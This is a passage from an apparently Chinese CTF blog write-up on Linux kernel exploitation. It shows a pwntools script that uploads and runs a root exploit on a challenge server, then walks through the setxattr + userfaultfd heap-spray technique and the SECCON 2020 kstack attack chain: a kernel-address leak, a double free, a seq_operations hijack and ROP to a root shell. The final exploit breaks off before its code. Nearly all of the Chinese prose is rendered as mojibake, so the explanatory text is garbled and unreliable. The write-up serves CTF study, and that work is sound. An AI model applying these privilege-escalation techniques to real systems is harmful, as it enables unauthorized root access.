<p>å…¶å®å†™çº¯æ±‡ç¼–æ˜¯æœ€å°çš„ï¼Œä½†æ˜¯ç€æ€¥æŠ¢ä¸€è¡€æ‰€ä»¥è¿˜æ˜¯å†™å¸¸è§„çš„Cï¼Œæ—©ä¸Šåˆæœ‰ä¸€ä¸ªå®éªŒè¦åšæŠŠæ—¶é—´å æ‰äº†ç»“æœæœ€ååªæ‹¿äº†ä¸‰è¡€â€¦</p>
</blockquote>
<p>æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;82.157.40.132&quot;</span>, <span class="hljs-number">54100</span>)<br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ä¼ è¿œç¨‹ï¼Œè¿è¡Œï¼ŒæˆåŠŸææƒ</p>
<p><img src="https://i.loli.net/2021/11/20/4Mtasj1QRYUAhcI.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="setxattr-userfaultfd-å †å ä½æŠ€æœ¯ï¼ˆmay-obsoleteï¼‰"><a href="#setxattr-userfaultfd-å †å ä½æŠ€æœ¯ï¼ˆmay-obsoleteï¼‰" class="headerlink" title="setxattr + userfaultfd å †å ä½æŠ€æœ¯ï¼ˆmay obsoleteï¼‰"></a><em>setxattr + userfaultfd å †å ä½æŠ€æœ¯ï¼ˆmay obsoleteï¼‰</em></h2><p>setxattr æ˜¯ä¸€ä¸ªååˆ†ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨æ—ï¼ŒæŠ›å¼€å…¶æœ¬èº«çš„åŠŸèƒ½ï¼Œåœ¨ kernel çš„åˆ©ç”¨å½“ä¸­ä»–å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›<strong>è¿‘ä¹ä»»æ„å¤§å°çš„å†…æ ¸ç©ºé—´ object åˆ†é…</strong></p>
<p>è§‚å¯Ÿ setxattr æºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>setxattr()</code> å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong></p>
<p>ä½†æ˜¯è¯¥ object åœ¨ setxattr æ‰§è¡Œç»“æŸæ—¶åˆä¼šè¢«æ”¾å› freelist ä¸­ï¼Œè®¾æƒ³è‹¥æ˜¯æˆ‘ä»¬éœ€è¦åŠ«æŒè¯¥ object çš„å‰ 8 å­—èŠ‚ï¼Œé‚£å°†å‰åŠŸå°½å¼ƒ</p>
<p>é‡æ–°è€ƒè™‘ setxattr çš„æ‰§è¡Œæµç¨‹ï¼Œå…¶ä¸­ä¼šè°ƒç”¨ <code>copy_from_user</code> ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬è€ƒè™‘å¦‚ä¸‹åœºæ™¯ï¼š</p>
<p>æˆ‘ä»¬é€šè¿‡ mmap åˆ†é…è¿ç»­çš„ä¸¤ä¸ªé¡µé¢ï¼Œåœ¨ç¬¬äºŒä¸ªé¡µé¢ä¸Šå¯ç”¨ userfaultfdï¼Œå¹¶åœ¨ç¬¬ä¸€ä¸ªé¡µé¢çš„æœ«å°¾å†™å…¥æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬è°ƒç”¨ setxattr è¿›è¡Œ<strong>è·¨é¡µé¢çš„æ‹·è´</strong>ï¼Œå½“ copy_from_user æ‹·è´åˆ°ç¬¬äºŒä¸ªé¡µé¢æ—¶<strong>ä¾¿ä¼šè§¦å‘ userfaultfdï¼Œä»è€Œè®© setxattr çš„æ‰§è¡Œæµç¨‹å¡åœ¨æ­¤å¤„ï¼Œè¿™æ ·è¿™ä¸ª object å°±ä¸ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè€Œæ˜¯å¯ä»¥ç»§ç»­å‚ä¸æˆ‘ä»¬æ¥ä¸‹æ¥çš„åˆ©ç”¨</strong></p>
<p><img src="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™ä¾¿æ˜¯ setxattr + userfaultfd ç»“åˆçš„å †å ä½æŠ€æœ¯</p>
<h3 id="ä¾‹é¢˜ï¼šSECCON-2020-kstack"><a href="#ä¾‹é¢˜ï¼šSECCON-2020-kstack" class="headerlink" title="ä¾‹é¢˜ï¼šSECCON 2020 kstack"></a>ä¾‹é¢˜ï¼šSECCON 2020 kstack</h3><h4 id="â‘ -åˆ†æ-4"><a href="#â‘ -åˆ†æ-4" class="headerlink" title="â‘  åˆ†æ"></a>â‘  åˆ†æ</h4><p>æƒ¯ä¾‹åœ°æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 512M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -net user -net nic -device e1000 \<br>    -monitor /dev/null \<br>    -nographic<br></code></pre></td></tr></table></figure>

<p>å¼€å¯äº† smep å’Œ kaslr</p>
<p>æŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></td></tr></table></figure>

<p>å¼€å¯äº† KPTI</p>
<p>æ‹–å…¥ IDA ä¸­è¿›è¡Œåˆ†æï¼Œå‘ç°åªå®šä¹‰äº†ä¸€ä¸ª ioctl çš„ä¸¤ç§åŠŸèƒ½</p>
<h5 id="åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹"><a href="#åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹"></a>åˆ›å»ºé“¾è¡¨èŠ‚ç‚¹</h5><p>å…ˆåˆ†æç¬¬ä¸€ç§åŠŸèƒ½ï¼Œåœ¨è¿™é‡Œå…ˆç”¨ kmalloc åˆ†é…äº†ä¸€ä¸ª objectï¼Œä¹‹åå°†å…¶ä½¿ç”¨å¤´æ’æ³•é€šè¿‡å…¨å±€å˜é‡ head æ’å…¥åˆ°å•å‘é“¾è¡¨ä¸­</p>
<p><img src="https://i.loli.net/2021/11/24/mxPugZ1TQCE3aNd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åˆ†æå¯çŸ¥å…¶ç»“æ„åº”å½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>            *unknown;<br>    <span class="hljs-type">char</span>             data[<span class="hljs-number">8</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>     *<span class="hljs-title">next</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>è¯¥ç»“æ„ä½“å‰å…«ä¸ªå­—èŠ‚æ˜¯ä» <code>current_task</code> çš„æŸä¸ªç‰¹æ®Šåç§»å–çš„å€¼ï¼Œç»å°è¯•å¯çŸ¥ä¸ºçº¿ç¨‹ç»„ idï¼Œæˆ‘ä»¬æ¥çœ‹å…¶åˆ†é…è¿‡ç¨‹ï¼Œä½¿ç”¨äº† <code>kmem_cache_alloc(kmalloc_caches[5], 0x60000C0)</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ flag ï¼Œä¸ºå¸¸è§„çš„ <code>GFP_KERNEL</code>ï¼Œè¿™é‡Œå¯ä»¥æš‚ä¸”å¿½ç•¥</p>
<p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬”è€…æ¨æµ‹è¿™åº”å½“æ˜¯ gcc ä¼˜åŒ– kmalloc çš„ç»“æœï¼›åœ¨å†…æ ¸ä¸­æœ‰ä¸€ä¸ªæ•°ç»„ <code>kmalloc_caches</code> å­˜æ”¾ kmem_cacheï¼Œåœ¨å†…æ ¸æºç  <code>mm/slab_common.c</code> ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥å…¶åˆå§‹åŒ–çš„å¤§å°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.</span><br><span class="hljs-comment"> * kmalloc_index() supports up to 2^25=32MB, so the final entry of the table is</span><br><span class="hljs-comment"> * kmalloc-32M.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>    INIT_KMALLOC_INFO(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">96</span>, <span class="hljs-number">96</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">192</span>, <span class="hljs-number">192</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">8</span>, <span class="hljs-number">8</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>),<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>ä¸‹æ ‡ <code>[5]</code> å³ç¬¬å…­ä¸ª kmem_cache ä¸º <code>kmalloc-32</code>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—çŸ¥åˆ†é…çš„ object å¤§å°ä¸º 0x20</p>
<h5 id="åˆ é™¤é“¾è¡¨èŠ‚ç‚¹"><a href="#åˆ é™¤é“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="åˆ é™¤é“¾è¡¨èŠ‚ç‚¹"></a>åˆ é™¤é“¾è¡¨èŠ‚ç‚¹</h5><p>æ¯”è¾ƒç®€å•ä¸”å¸¸è§„çš„è„±é“¾æ“ä½œï¼Œä¼šå°†åŒä¸€çº¿ç¨‹ç»„åˆ›å»ºçš„èŠ‚ç‚¹ä¸­çš„å¤´èŠ‚ç‚¹åˆ é™¤ï¼Œå¹¶å°†å…¶ data æ‹·è´ç»™ç”¨æˆ·</p>
<p><img src="https://i.loli.net/2021/11/24/jAEpYPWQSvDbq5M.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‹¥å¹¶èŠ‚ç‚¹æ‰€å±çº¿ç¨‹ç»„ä¸å½“å‰è¿›ç¨‹éåŒä¸€çº¿ç¨‹ç»„ï¼Œåˆ™ä¼šä¸€ç›´æ‰¾åˆ°é‚£ä¸ªçº¿ç¨‹ç»„çš„èŠ‚ç‚¹æˆ–æ˜¯éå†ç»“æŸä¸ºæ­¢</p>
<p><img src="https://i.loli.net/2021/11/25/s2SDNnlTWPobk6d.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åˆ†æä¸‹æ¥ï¼Œè”æƒ³åˆ°é¢˜ç›®åå« <code>k stack</code>ï¼Œæˆ‘ä»¬ä¸éš¾çŒœå‡ºè¿™æ˜¯åœ¨æ¨¡æ‹Ÿæ ˆçš„ push ä¸ pop æ“ä½œ</p>
<h4 id="â‘¡-åˆ©ç”¨-1"><a href="#â‘¡-åˆ©ç”¨-1" class="headerlink" title="â‘¡ åˆ©ç”¨"></a>â‘¡ åˆ©ç”¨</h4><p>æˆ‘ä»¬æ³¨æ„åˆ°å…¶æ‹·è´æ—¶ä½¿ç”¨äº† copy_from_user ä¸ copy_to_userï¼Œä¸” <strong>ioctl æ“ä½œå…¨ç¨‹æ²¡æœ‰åŠ é”</strong>ï¼Œè¿™ä¸º userfaultfd æä¾›äº†å¯èƒ½æ€§</p>
<h5 id="1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm-file-data"><a href="#1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm-file-data" class="headerlink" title="1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm_file_data"></a>1ï¼‰æ³„éœ²å†…æ ¸åŸºå€ï¼šshm_file_data</h5><p>åœ¨åˆ›å»ºèŠ‚ç‚¹æ—¶å…ˆå°†æ–°çš„ object èµ‹ç»™ head æŒ‡é’ˆï¼Œä¹‹åå†è°ƒç”¨ copy_from_userï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå¯ä»¥é€šè¿‡ userfaultfd è®©åˆ†é…çº¿ç¨‹åœ¨ copy_from_user è¿™é‡Œå¡ä½ï¼Œä¹‹åæˆ‘ä»¬åœ¨ userfaultfd çº¿ç¨‹å½“ä¸­å†å°†è¯¥ object é‡Šæ”¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿè¯»å‡º 8 å­—èŠ‚çš„â€œè„æ•°æ®â€ï¼Œé‚£ä¹ˆåœ¨å¦‚æ­¤ä¹‹å‰æˆ‘ä»¬åº”å½“åˆ†é…ä¸€ä¸ªå¸¦æœ‰å¯ç”¨æ•°æ®çš„ç»“æ„ä½“å¹¶é‡Šæ”¾</p>
<p>ç”±äºé¢˜ç›®é™åˆ¶äº†åˆ†é…çš„ object çš„å¤§å°ï¼Œæ•…æˆ‘ä»¬åº”å½“è€ƒè™‘ä» kmallc-32 ä¸­åˆ†é…çš„ç»“æ„ä½“ï¼Œè¿™é‡Œç¬”è€…é€‰ç”¨ <code>shm_file_data</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> &#123;</span><br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥è¯»å–çš„ <code>ns</code> åŸŸåˆšå¥½æŒ‡å‘å†…æ ¸ .text æ®µï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºå†…æ ¸åŸºå€</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨é€šè¿‡ <code>shmget</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå…±äº«å†…å­˜ä¹‹åé€šè¿‡ <code>shmat</code> ç³»ç»Ÿè°ƒç”¨è·å¾—è¯¥ç»“æ„ä½“ï¼Œé€šè¿‡ <code>shmdt</code> æˆ‘ä»¬å¯ä»¥é‡Šæ”¾è¯¥ç»“æ„ä½“</p>
<blockquote>
<p> åœ¨è¿™é‡Œæœ‰ä¸ªç¬”è€…å¼„ä¸æ˜ç™½åŸå› çš„ç‚¹ï¼šæˆ‘ä»¬éœ€è¦å…ˆåˆ›å»º userfaultfd çº¿ç¨‹åå†è¿›è¡Œ shm æ“ä½œï¼Œ<strong>å¦åˆ™ä¼šå¤±è´¥</strong>ï¼Œåœ¨ç¬”è€…ç†è§£ä¸­è¿™æ“ä½œä¸¤ä¸ªä¹‹é—´çš„é¡ºåºå¹¶ä¸å…³é”®</p>
</blockquote>
<h5 id="2ï¼‰æ„é€ -double-free"><a href="#2ï¼‰æ„é€ -double-free" class="headerlink" title="2ï¼‰æ„é€  double free"></a>2ï¼‰æ„é€  double free</h5><p>æ„é€  double free çš„æµç¨‹æ¯”è¾ƒç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ pop æ—¶é€šè¿‡ copy_to_user è§¦å‘ userfaultfdï¼Œåœ¨ userfaultfd çº¿ç¨‹ä¸­å† pop ä¸€æ¬¡å³å¯</p>
<h5 id="3ï¼‰userfaultfd-setxattr-åŠ«æŒ-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"><a href="#3ï¼‰userfaultfd-setxattr-åŠ«æŒ-seq-operations-æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ" class="headerlink" title="3ï¼‰userfaultfd + setxattr åŠ«æŒ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ"></a>3ï¼‰userfaultfd + setxattr åŠ«æŒ seq_operations æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</h5><p>ç°åœ¨åœ¨ kmalloc-32 å½“ä¸­çš„ç¬¬ä¸€ä¸ª object æŒ‡å‘è‡ªèº«ï¼Œé‚£ä¹ˆåœ¨æ¥ä¸‹æ¥çš„ä¸¤æ¬¡åˆ†é…ä¸­æˆ‘ä»¬éƒ½å°†ä¼šè·å¾—åŒä¸€ä¸ª objectï¼Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ç¬”è€…é€‰æ‹©åˆ†é…åˆ° seq_operations å¤„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ setxattr å†ä¸€æ¬¡åˆ†é…åˆ°è¯¥ objectï¼Œé€šè¿‡ setxattr æ›´æ”¹ seq_operations ä¸­çš„æŒ‡é’ˆ</p>
<p>ç”±äºæˆ‘ä»¬éœ€è¦åŠ«æŒå…¶ç¬¬ä¸€ä¸ªæŒ‡é’ˆï¼Œæ•…è¿™é‡Œæˆ‘ä»¬ä¸èƒ½å¤Ÿè®© setxattr æ‰§è¡Œåˆ°æœ«å°¾å°† object åˆé‡Šæ”¾æ‰ï¼Œè€Œåº”å½“åœ¨ setxattr ä¸­çš„ copy_from_user ä¸­ç”¨ userfaultfd å¡ä½ï¼Œåœ¨ userfaultfd çº¿ç¨‹ä¸­è§¦å‘åŠ«æŒåæŒ‡é’ˆæ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</p>
<p>æ§åˆ¶å†…æ ¸æ‰§è¡Œæµåç¬”è€…é€‰æ‹©ç”¨å¸¸è§„çš„ pt_regs æ¥å®Œæˆ ROP</p>
<h5 id="4-ä¿®å¤-kmalloc-32-çš„-freelist-æ‹¿åˆ°ç¨³å®š-root-shell"><a href="#4-ä¿®å¤-kmalloc-32-çš„-freelist-æ‹¿åˆ°ç¨³å®š-root-shell" class="headerlink" title="4) ä¿®å¤ kmalloc-32 çš„ freelist æ‹¿åˆ°ç¨³å®š root shell"></a>4) ä¿®å¤ kmalloc-32 çš„ freelist æ‹¿åˆ°ç¨³å®š root shell</h5><p>åœ¨æˆ‘ä»¬é€šè¿‡ double free å®Œæˆåˆ©ç”¨ä¹‹åï¼Œ<strong>å†…æ ¸ç©ºé—´çš„ kmalloc-32 çš„ freelistå·²ç»è¢«ç ´åäº†</strong>ï¼Œæ­¤æ—¶æˆ‘ä»¬è‹¥æ˜¯ç›´æ¥èµ·ä¸€ä¸ª shell åˆ™ä¼šé€ æˆ kernel panicï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿”å›ç”¨æˆ·ç©ºé—´ä¹‹åéœ€è¦å…ˆä¿®å¤ freelist</p>
<p>ä¿®å¤ freelist åªéœ€è¦å¾€é‡Œé¢æ”¾å…¥ä¸€å®šæ•°é‡çš„ object å³å¯ï¼Œç¬”è€…é€‰æ‹©åœ¨ä¸€å¼€å§‹æ—¶å…ˆå¤šæ¬¡æ‰“å¼€ <code>/proc/self/stat</code> åˆ†é…å¤§é‡ seq_operations ç»“æ„ä½“åšå¤‡ç”¨ï¼Œä¹‹ååœ¨ setxattr çº¿ç¨‹ä¸­å°†å…¶å…¨éƒ¨é‡Šæ”¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿå®Œç¾ç€é™†å›ç”¨æˆ·æ€ï¼Œå®‰å…¨åœ°èµ·ä¸€ä¸ªç¨³å®šçš„ root shell</p>
<h4 id="â‘¢-FINAL-EXPLOIT-5"><a href="#â‘¢-FINAL-EXPLOIT-5" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h4><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>kernelpwn.h è§æœ¬æ–‡å¼€å¤´</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 